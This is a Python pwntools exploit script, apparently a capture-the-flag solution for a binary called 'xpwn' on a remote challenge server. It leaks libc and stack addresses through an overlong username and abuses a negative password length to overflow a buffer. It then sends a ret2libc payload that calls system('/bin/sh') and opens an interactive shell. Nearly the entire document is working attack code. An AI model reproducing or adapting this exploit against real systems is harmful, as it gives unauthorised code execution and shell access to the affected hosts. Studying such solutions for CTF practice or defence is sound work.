from pwn import *
import binascii

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
debug = 0

env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}

if debug:
    p = process("./xpwn", env=env)
else:
    p = remote("116.85.48.105", 5005)

libc = ELF("./libc.so.6")
elf = ELF("./xpwn")
#gdb.attach(proc.pidof(p)[0])
main = 0x80486c3
libc_start_main_got = elf.got['__libc_start_main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

payload = 'A' * 0x3f
p.sendlineafter('Enter username:', payload)
data = p.recvline()
line = p.recv(1024)
lib = line[0:4]
data = line[8:12]
print "get:" + hex(u32(data))

libc_start_main_addr = u32(lib) - 0x198820
esp = u32(data) - 0x4c
print "__libc:" + hex(libc_start_main_addr)
system_addr = libc_start_main_addr - (libc.symbols['__libc_start_main'] - libc.symbols['system'])
binsh_addr = libc_start_main_addr - (libc.symbols['__libc_start_main'] - next(libc.search("/bin/sh")))

p.recvuntil("Please set the length of password:")
p.sendline("-1")
ecx = esp + 4
print "esp:" + hex(ecx)
ebx = p32(0)
ebp = p32(0)
print 'system_addr: ' + hex(system_addr)
print 'binsh_addr: ' + hex(binsh_addr)
payload = p32(system_addr) + p32(main) + p32(binsh_addr) + 'A' * 56 + p32(ecx) + ebx + ebp
p.sendline(payload)
p.interactive()